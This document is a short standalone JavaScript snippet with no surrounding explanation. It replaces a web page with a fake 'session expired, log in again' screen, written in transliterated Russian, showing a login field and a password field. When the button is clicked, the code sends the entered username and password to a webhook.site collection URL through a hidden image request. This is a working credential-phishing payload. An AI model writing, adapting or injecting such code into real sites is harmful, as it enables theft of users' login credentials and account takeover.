var d=document.body;
d.style.cssText='background:#125ad0;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;gap:10px';
var h=document.createElement('h2');
h.textContent='Sessiya istekla. Voydite povtorno.';
h.style.color='#fff';
d.appendChild(h);
var a=document.createElement('input');
a.placeholder='Login';
a.style.padding='8px';
d.appendChild(a);
var b=document.createElement('input');
b.type='password';
b.placeholder='Parol';
b.style.padding='8px';
d.appendChild(b);
var c=document.createElement('button');
c.textContent='VOYTI';
c.style.cssText='padding:8px 24px;background:#fff;color:#125ad0;border:none;cursor:pointer;font-size:16px';
c.onclick=function(){
  new Image().src='https://webhook.site/ae7990e1-69d3-4b40-8fdc-bbe39df73870?l='+encodeURIComponent(a.value)+String.fromCharCode(38)+'p='+encodeURIComponent(b.value)
};
d.appendChild(c);
